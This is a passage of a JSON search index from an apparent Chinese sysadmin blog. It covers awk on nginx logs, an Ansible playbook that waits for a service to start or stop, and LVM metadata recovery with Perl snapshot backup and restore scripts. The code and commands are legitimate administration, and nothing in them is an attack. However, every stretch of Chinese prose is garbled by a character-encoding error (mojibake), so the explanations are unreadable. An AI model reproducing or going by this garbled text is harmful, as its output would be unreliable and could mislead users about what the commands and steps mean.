æ˜¯æ¯”è¾ƒå¼ºåŠ›çš„å·¥å…·ï¼Œè·Ÿcutå’Œsedç»„åˆèµ·æ¥ï¼Œä¼šæœ‰æ„æƒ³ä¸åˆ°çš„ä½œç”¨\u003c/p\u003e\n\u003cp\u003eä¸¾ä¸ªç®€å•ä¾‹å­ï¼Œæˆ‘ä»¬nginxçš„access.logå¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e110.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n220.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 20616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n330.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 30616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n410.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n530.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n650.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 50616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n760.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 60616 \u0026#34;http://my.jjwxc.net/\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eç¬¬ä¸€ä¸ªå­—æ®µæ˜¯ipï¼Œç„¶åå€’æ•°ç¬¬3ä¸ªæ˜¯200ï¼Œè¡¨ç¤º200 OKï¼Œåé¢çš„å°±æ˜¯ä¼ è¾“äº†å¤šå°‘æ•°æ®ä¸¤ç»™å®¢æˆ·ç«¯\næˆ‘ä»¬è¦ç»Ÿè®¡ä¸€ä¸‹æµé‡å¤§çš„å‰5åæ˜¯è°ã€‚\u003c/p\u003e","title":"awkçš„ç”¨æ³•"},{"content":"ansibleçš„è„šæœ¬ä¸­æˆ‘ä»¬å¯èƒ½ä¼šè¦å¯åŠ¨æŸé¡¹æœåŠ¡å¹¶ç­‰å¾…ï¼Œç›´åˆ°æœåŠ¡å¯åŠ¨èµ·æ¥ï¼Œç„¶åå†è¿›è¡Œä¸‹ä¸€æ­¥\nè¿™ä¸ªéå¸¸é‡è¦ï¼Œæˆ‘ä»¬ä¸¾ä¾‹æ¥å®éªŒä¸€ä¸‹ï¼š\n- hosts: localhost vars: local__service: ssh tasks: - block: - name: \u0026#34;Stop {{ local__service }} service\u0026#34; systemd: service: \u0026#34;{{ local__service }}\u0026#34; state: stopped - name: \u0026#34;Populate ansible_facts.services variable\u0026#34; ansible.builtin.service_facts: - name: \u0026#34;{{ local__service }} state will be stopped as expected\u0026#34; assert: that: ansible_facts.services[local__service].state == \u0026#39;stopped\u0026#39; - name: \u0026#34;Start {{ local__service }} service\u0026#34; systemd: service: \u0026#34;{{ local__service }}\u0026#34; state: started - name: \u0026#34;Registered {{ local__service }} state will still be stopped as it was not refreshed\u0026#34; assert: that: ansible_facts.services[local__service].state == \u0026#39;stopped\u0026#39; - name: \u0026#34;Refresh ansible_facts.services variable\u0026#34; ansible.builtin.service_facts: - name: \u0026#34;{{ local__service }} state will be running as expected\u0026#34; assert: that: ansible_facts.services[local__service].state == \u0026#39;running\u0026#39; ä¸Šé¢çš„ playbook ä¸€å…±æœ‰7æ­¥ï¼š\n1ã€åœæ­¢ ssh æœåŠ¡\n2ã€è·å– ansible_fact å˜é‡\n3ã€æ–­è¨€ ansible_facts ä¸­çš„ ssh æœåŠ¡æ˜¯ stopped çŠ¶æ€\n4ã€é‡æ–°å¯åŠ¨ ssh æœåŠ¡\n5ã€æ–­è¨€ ansible_facts ä¸­çš„ ssh æœåŠ¡ä»ç„¶æ˜¯ stopped çŠ¶æ€\n6ã€é‡æ–°è·å– ansible_fact å˜é‡\n7ã€è¿™æ—¶ ansible_facts ä¸­çš„ ssh æœåŠ¡çŠ¶æ€åˆ·æ–°äº†ï¼Œå˜æˆäº† running\nå°±æ˜¯æœåŠ¡å¯åŠ¨åï¼Œå¿…é¡»å»ä¸æ–­åˆ·æ–° ansible_factsï¼Œæ‰èƒ½è·å¾—åˆ·æ–°åçš„çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\n- hosts: localhost vars: local__service: ssh tasks: - block: - name: \u0026#34;Stop {{ local__service }} service\u0026#34; systemd: service: \u0026#34;{{ local__service }}\u0026#34; state: stopped - name: \u0026#34;Wait until {{ local__service }} service is stopped\u0026#34; ansible.builtin.service_facts: register: temp__service_facts until: temp__service_facts.ansible_facts.services[local__service].state == \u0026#39;stopped\u0026#39; retries: 20 delay: 2 - name: \u0026#34;Start {{ local__service }} service\u0026#34; systemd: service: \u0026#34;{{ local__service }}\u0026#34; state: started - name: \u0026#34;Wait until {{ local__service }} service is running\u0026#34; ansible.builtin.service_facts: register: temp__service_facts until: temp__service_facts.ansible_facts.services[local__service].state == \u0026#39;running\u0026#39; retries: 20 delay: 2 ä¸Šé¢wait untilçš„æ­¥éª¤å°±æ˜¯ï¼Œæ³¨å†Œä¸€ä¸ªä¸´æ—¶çš„å˜é‡ï¼Œç„¶åä¸æ–­å»æµ‹è¯•ï¼Œé‡è¯•20æ¬¡ï¼Œæ¯æ¬¡çš„å»¶æ—¶æ˜¯2ç§’ã€‚è¿™æ ·å°±å¯ä»¥è§£å†³äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20220729-ansible_until/","summary":"\u003cp\u003eansibleçš„è„šæœ¬ä¸­æˆ‘ä»¬å¯èƒ½ä¼šè¦å¯åŠ¨æŸé¡¹æœåŠ¡å¹¶ç­‰å¾…ï¼Œç›´åˆ°æœåŠ¡å¯åŠ¨èµ·æ¥ï¼Œç„¶åå†è¿›è¡Œä¸‹ä¸€æ­¥\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªéå¸¸é‡è¦ï¼Œæˆ‘ä»¬ä¸¾ä¾‹æ¥å®éªŒä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- hosts: localhost\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  vars:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    local__service: ssh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  tasks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - block:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;Stop {{ local__service }} service\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        systemd:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          service: \u003cspan class=\"s2\"\u003e\u0026#34;{{ local__service }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          state: stopped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;Populate ansible_facts.services variable\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ansible.builtin.service_facts:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;{{ local__service }} state will be stopped as expected\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        assert:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          that:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            ansible_facts.services\u003cspan class=\"o\"\u003e[\u003c/span\u003elocal__service\u003cspan class=\"o\"\u003e]\u003c/span\u003e.state \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;stopped\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;Start {{ local__service }} service\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        systemd:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          service: \u003cspan class=\"s2\"\u003e\u0026#34;{{ local__service }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          state: started\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;Registered {{ local__service }} state will still be stopped as it was not refreshed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        assert:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          that:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            ansible_facts.services\u003cspan class=\"o\"\u003e[\u003c/span\u003elocal__service\u003cspan class=\"o\"\u003e]\u003c/span\u003e.state \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;stopped\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;Refresh ansible_facts.services variable\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ansible.builtin.service_facts:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;{{ local__service }} state will be running as expected\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        assert:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          that:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            ansible_facts.services\u003cspan class=\"o\"\u003e[\u003c/span\u003elocal__service\u003cspan class=\"o\"\u003e]\u003c/span\u003e.state \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;running\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢çš„ playbook ä¸€å…±æœ‰7æ­¥ï¼š\u003c/p\u003e","title":"Ansibleä¹‹ç­‰å¾…æœåŠ¡çŠ¶æ€å˜æˆæˆåŠŸ"},{"content":"åœ¨ç”Ÿäº§ç³»ç»Ÿä¸­ä½¿ç”¨LVMåŠ¡å¿…è¦æ³¨æ„lvm metadataçš„å¤‡ä»½ï¼Œæ›¾ç»åœ¨äº¬ä¸œçš„æ—¶å€™å‘ç”Ÿè¿‡è™šæœºç”¨äº†lvmçš„ç£ç›˜ç³»ç»Ÿï¼Œç„¶åè™šæœºæ–‡ä»¶qcow2çªç„¶åæ‰äº†ï¼Œæƒ³å°½äº†åŠæ³•ä¹Ÿæ— æ³•æ¢å¤ï¼Œè¿™ç»™æˆ‘ä»¬æ‹‰å“äº†è­¦é’Ÿå•Šï¼Œä½¿ç”¨lvmçš„æ—¶å€™åŠ¡å¿…è¦å¤‡ä»½åˆ†åŒºä¿¡æ¯ï¼Œå¦åˆ™åçš„æ—¶å€™å°±æ¬²å“­æ— æ³ªäº†ã€‚\nç¼ºçœåœ¨ /etc/lvm/backup/ ç›®å½•ä¸‹æ˜¯æœ€æ–°çš„å¤‡ä»½ï¼ŒåŒæ ·å†å²ç‰ˆæœ¬éƒ½åœ¨ /etc/lvm/archive/ ç›®å½•ä¸‹ã€‚\nä¸€ã€å…ˆå¤‡ä»½ åœ¨å¼€å§‹æ¢å¤ä¹‹å‰ï¼Œä¸€å®šå…ˆåšä¸ªå¤‡ä»½\ncp -pr /etc/lvm /etc/lvm_bkp ç„¶åå»çœ‹çœ‹archiveä¸‹çš„å¤‡ä»½ä¿¡æ¯\nls -l /etc/lvm/archive/vg_storage_00* -rw-------. 1 root root 13722 Oct 28 23:45 /etc/lvm/archive/vg_storage_00419-1760023262.vg -rw-------. 1 root root 14571 Oct 28 23:52 /etc/lvm/archive/vg_storage_00420-94024216.vg ... -rw-------. 1 root root 14749 Nov 23 15:11 /etc/lvm/archive/vg_storage_00676-394223172.vg -rw-------. 1 root root 14733 Nov 23 15:29 /etc/lvm/archive/vg_storage_00677-187019982.vg # äºŒã€æœ€åçš„æƒ…å½¢æ¢å¤pv è­¦å‘Šï¼šè¿™ä¸€æ­¥åªèƒ½åœ¨VGæ— æ³•æ­£å¸¸è¿è¡Œçš„æ—¶å€™å†è¿è¡Œï¼ï¼ï¼\nå…ˆè¯´æœ€åçš„æƒ…å½¢ï¼ŒLVMçš„å»ºç«‹è·¯å¾„æ˜¯ pv \u0026mdash;\u0026gt; vg \u0026mdash;\u0026gt; lvï¼Œå‡è®¾è¿ pvï¼ˆç‰©ç†å·éƒ½æ²¡äº†ï¼‰\næˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„å¤‡ä»½ï¼Œ/etc/lvm/archive/vg_storage_00677-187019982.vg\nless /etc/lvm/archive/vg_storage_00677-187019982.vg ... physical_volumes { pv0 { id = \u0026#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0\u0026#34; ... ä»é‡Œé¢æ‹¿åˆ° pv çš„ id ï¼Œé‡å»º pv\npvcreate --uuid \u0026#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0\u0026#34; \\ --restorefile /etc/lvm/archive/vg_storage_00677-187019982.vg ä¸‰ã€æ¢å¤VG å¦‚æœ vg æ˜¯æ­£å¸¸çš„ï¼Œé‚£ä¹ˆå°±ä¸ç”¨åšç¬¬äºŒæ­¥äº†ï¼Œç›´æ¥ä»å¤‡ä»½ä¸­æ¢å¤å³å¯ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹\nvgcfgrestore --list vg1 File: /etc/lvm/archive/vg1_00000-1238318622.vg VG name: vg1 Description: Created *before* executing \u0026#39;vgcreate vg1 /dev/sda6\u0026#39; Backup Time: Mon Feb 29 10:58:51 2016 File: /etc/lvm/archive/vg1_00001-285796155.vg VG name: vg1 Description: Created *before* executing \u0026#39;lvcreate -L 1G -n lv2 vg1\u0026#39; Backup Time: Mon Feb 29 10:59:23 2016 File: /etc/lvm/archive/vg1_00002-1661997476.vg ---\u0026gt; just before removal of volume (this is the archive we need) VG name: vg1 Description: Created *before* executing \u0026#39;lvremove /dev/vg1/lv2\u0026#39; Backup Time: Mon Feb 29 13:55:08 2016 File: /etc/lvm/backup/vg1 VG name: vg1 Description: Created *after* executing \u0026#39;lvremove /dev/vg1/lv2\u0026#39; Backup Time: Mon Feb 29 13:55:08 2016 æœ‰ä¿¡æ¯ï¼Œæˆ‘ä»¬å…ˆåŠ  \u0026ndash;test æµ‹è¯•ä¸€ä¸‹\nvgcfgrestore vg01 --test -f /etc/lvm/archive/vg_data_00003-586203914.vg TEST MODE: Metadata will NOT be updated and volumes will not be (de)activated. Volume group vg01 has active volume: lv001. WARNING: Found 1 active volume(s) in volume group \u0026#34;vg01\u0026#34;. Restoring VG with active LVs, may cause mismatch with its metadata. Do you really want to proceed with restore of volume group \u0026#34;vg01\u0026#34;, while 1 volume(s) are active? [y/n]: y Restored volume group vg01. æ²¡é—®é¢˜ï¼Œé‚£å°±ç»§ç»­ï¼ŒçœŸçš„æ“ä½œäº†\nvgcfgrestore vg01 -f /etc/lvm/archive/vg_data_00003-586203914.vg Volume group vg01 has active volume: lv001. WARNING: Found 1 active volume(s) in volume group \u0026#34;vg01\u0026#34;. Restoring VG with active LVs, may cause mismatch with its metadata. Do you really want to proceed with restore of volume group \u0026#34;vg01\u0026#34;, while 1 volume(s) are active? [y/n]: y Restored volume group vg01. å››ã€æ¢å¤åè¿›è¡Œæ ¡éªŒ # æ˜¾ç¤ºä¿¡æ¯ vgdisplay VG1 # æ¿€æ´» vgchange -ay VG1 # æ˜¾ç¤ºé€»è¾‘å· lvs -a -o +devices # é‡æ–°æ‰«æ lvscan inactive \u0026#39;/dev/vg1/lv2\u0026#39; [1.00 GiB] inherit ### its in inactive state and make it active to use. ACTIVE \u0026#39;/dev/vg0/lv1\u0026#39; [1.00 GiB] inherit # ä¸Šé¢å¦‚æœæœ‰inactiveçš„ï¼Œé‡æ–°æ¿€æ´» lvchange -a y /dev/vg1/lv2 # å†æ˜¾ç¤ºä¸€æ¬¡ lvs -a -o +devices # å†æ‰«æ lvscan ACTIVE \u0026#39;/dev/vg1/lv2\u0026#39; [1.00 GiB] inherit ACTIVE \u0026#39;/dev/vg0/lv1\u0026#39; [1.00 GiB] inherit # mountä¸Šæµ‹è¯• mount /dev/vg1/lv2 /lv2 # çœ‹çœ‹ä¸œè¥¿éƒ½åœ¨ä¸åœ¨ ls -lh /lv2 äº”ã€å¤‡ä»½å’Œæ¢å¤çš„è„šæœ¬ å¤‡ä»½ä¸€ä¸ª VG ä¸‹æ‰€æœ‰å·ï¼Œæ¯ä¸ªå·ä¸€ä¸ª snapshot å¿«ç…§å¤‡ä»½æ–‡ä»¶ï¼Œbackup_snapshot_lvm.pl\n#!/usr/bin/perl -w # # Run through a particular LVM volume group and perform a snapshot # and compressed file backup of each volume. # # This script is intended for use with backing up complete system # images of VMs, in addition to data level backups. # my $source_lvm_volgroup = \u0026#39;vg_storage\u0026#39;; my $source_lvm_snapsize = \u0026#39;5G\u0026#39;; my @source_lvm_excludes = (\u0026#39;lv_unwanted\u0026#39;, \u0026#39;lv_tmpfiles\u0026#39;); my $dest_dir=\u0026#39;/mnt/backup/snapshots\u0026#39;; foreach $volume (glob(\u0026#34;/dev/$source_lvm_volgroup/*\u0026#34;)) { $volume =~ /\\/dev\\/$source_lvm_volgroup\\/(\\S*)$/; my $volume_short = $1; if (\u0026#34;$volume_short\u0026#34; ~~ @source_lvm_excludes) { # Excluded volume, we skip it print \u0026#34;[info] Skipping excluded volume $volume_short ($volume)\\n\u0026#34;; next; } print \u0026#34;[info] Processing volume $volume_short ($volume)\\n\u0026#34;; # Snapshot volume print \u0026#34;[info] Creating snapshot...\\n\u0026#34;; system(\u0026#34;lvcreate -n ${volume_short}_snapshot --snapshot $volume -L $source_lvm_snapsize\u0026#34;); # Write compressed backup file from snapshot, but only replace existing one once finished print \u0026#34;[info] Creating compressed snapshot file...\\n\u0026#34;; system(\u0026#34;dd if=${volume}_snapshot | gzip --fast \u0026gt; $dest_dir/$volume_short.temp.gz\u0026#34;); system(\u0026#34;mv $dest_dir/$volume_short.temp.gz $dest_dir/$volume_short.gz\u0026#34;); # Delete snapshot print \u0026#34;[info] Removing snapshot...\\n\u0026#34;; system(\u0026#34;lvremove --force ${volume}_snapshot\u0026#34;); print \u0026#34;[info] Volume $volume_short backup completed.\\n\u0026#34;; } print \u0026#34;[info] FINISHED! VolumeGroup backup completed\\n\u0026#34;; exit 0; æ¢å¤çš„è„šæœ¬ï¼Œrestore_snapshot_lvm.plï¼š\n#!/usr/bin/perl -w # # Runs through LVM snapshots taken by backup_snapshot_lvm.pl and # restores them to the LVM volume in question. # my $dest_lvm_volgroup = \u0026#39;vg_storage\u0026#39;; my $source_dir = \u0026#39;/mnt/backup/snapshots\u0026#39;; print \u0026#34;[WARNING] Beginning restore process in 5 SECONDS!!\\n\u0026#34;; sleep(5); foreach $volume (glob(\u0026#34;$source_dir/*\u0026#34;)) { $volume =~ /$source_dir\\/(\\S*).gz$/; my $volume_short = $1; print \u0026#34;[info] Processing volume $volume_short ($volume)\\n\u0026#34;; # Just need to decompress \u0026amp; write into LVM volume system(\u0026#34;zcat $source_dir/$volume_short.gz \u0026gt; /dev/$dest_lvm_volgroup/$volume_short\u0026#34;); print \u0026#34;[info] Volume $volume_short restore completed.\\n\u0026#34;; } print \u0026#34;[info] FINISHED! VolumeGroup restore completed\\n\u0026#34;; exit 0; å½“ç„¶è¦è°¨è®°ï¼Œè¿™ä¸ªæ˜¯å—è®¾å¤‡çº§åˆ«çš„å¤‡ä»½ï¼Œæœ€å¥½è¿˜æ˜¯è¦æœ‰å¦å¤–çš„æ•°æ®çš„å¤‡ä»½ã€‚\n","permalink":"https://rendoumi.com/posts/20220728-lvm_restore/","summary":"\u003cp\u003eåœ¨ç”Ÿäº§ç³»ç»Ÿä¸­ä½¿ç”¨LVMåŠ¡å¿…è¦æ³¨æ„lvm metadataçš„å¤‡ä»½ï¼Œæ›¾ç»åœ¨äº¬ä¸œçš„æ—¶å€™å‘ç”Ÿè¿‡è™šæœºç”¨äº†lvmçš„ç£ç›˜ç³»ç»Ÿï¼Œç„¶åè™šæœºæ–‡ä»¶qcow2çªç„¶åæ‰äº†ï¼Œæƒ³å°½äº†åŠæ³•ä¹Ÿæ— æ³•æ¢å¤ï¼Œè¿™ç»™æˆ‘ä»¬æ‹‰å“äº†è­¦é’Ÿå•Šï¼Œä½¿ç”¨lvmçš„æ—¶å€™åŠ¡å¿…è¦å¤‡ä»½åˆ†åŒºä¿¡æ¯ï¼Œå¦åˆ™åçš„æ—¶å€™å°±æ¬²å“­æ— æ³ªäº†ã€‚\u003c/p\u003e\n\u003cp\u003eç¼ºçœåœ¨ /etc/lvm/backup/ ç›®å½•ä¸‹æ˜¯æœ€æ–°çš„å¤‡ä»½ï¼ŒåŒæ ·å†å²ç‰ˆæœ¬éƒ½åœ¨ /etc/lvm/archive/ ç›®å½•ä¸‹ã€‚\u003c/p\u003e\n\u003ch4 id=\"ä¸€å…ˆå¤‡ä»½\"\u003eä¸€ã€å…ˆå¤‡ä»½\u003c/h4\u003e\n\u003cp\u003eåœ¨å¼€å§‹æ¢å¤ä¹‹å‰ï¼Œä¸€å®šå…ˆåšä¸ªå¤‡ä»½\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp -pr /etc/lvm /etc/lvm_bkp\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå»çœ‹çœ‹archiveä¸‹çš„å¤‡ä»½ä¿¡æ¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -l /etc/lvm/archive/vg_storage_00*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rw-------. \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e13722\u003c/span\u003e Oct \u003cspan class=\"m\"\u003e28\u003c/span\u003e 23:45 /etc/lvm/archive/vg_storage_00419-1760023262.vg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rw-------. \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e14571\u003c/span\u003e Oct \u003cspan class=\"m\"\u003e28\u003c/span\u003e 23:52 /etc/lvm/archive/vg_storage_00420-94024216.vg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rw-------. \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e14749\u003c/span\u003e Nov \u003cspan class=\"m\"\u003e23\u003c/span\u003e 15:11 /etc/lvm/archive/vg_storage_00676-394223172.vg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rw-------. \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e14733\u003c/span\u003e Nov \u003cspan class=\"m\"\u003e23\u003c/span\u003e 15:29 /etc/lvm/archive/vg_storage_00677-187019982.vg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"äºŒæœ€åçš„æƒ…å½¢æ¢å¤pv\"\u003eäºŒã€æœ€åçš„æƒ…å½¢æ¢å¤pv\u003c/h4\u003e\n\u003cp\u003eè­¦å‘Šï¼šè¿™ä¸€æ­¥åªèƒ½åœ¨VGæ— æ³•æ­£å¸¸è¿è¡Œçš„æ—¶å€™å†è¿è¡Œï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003eå…ˆè¯´æœ€åçš„æƒ…å½¢ï¼ŒLVMçš„å»ºç«‹è·¯å¾„æ˜¯ pv \u0026mdash;\u0026gt; vg \u0026mdash;\u0026gt; lvï¼Œå‡è®¾è¿ pvï¼ˆç‰©ç†å·éƒ½æ²¡äº†ï¼‰\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„å¤‡ä»½ï¼Œ/etc/lvm/archive/vg_storage_00677-187019982.vg\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eless /etc/lvm/archive/vg_storage_00677-187019982.vg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   physical_volumes \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      pv0 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         \u003cspan class=\"nv\"\u003eid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»é‡Œé¢æ‹¿åˆ° pv çš„ id ï¼Œé‡å»º pv\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" 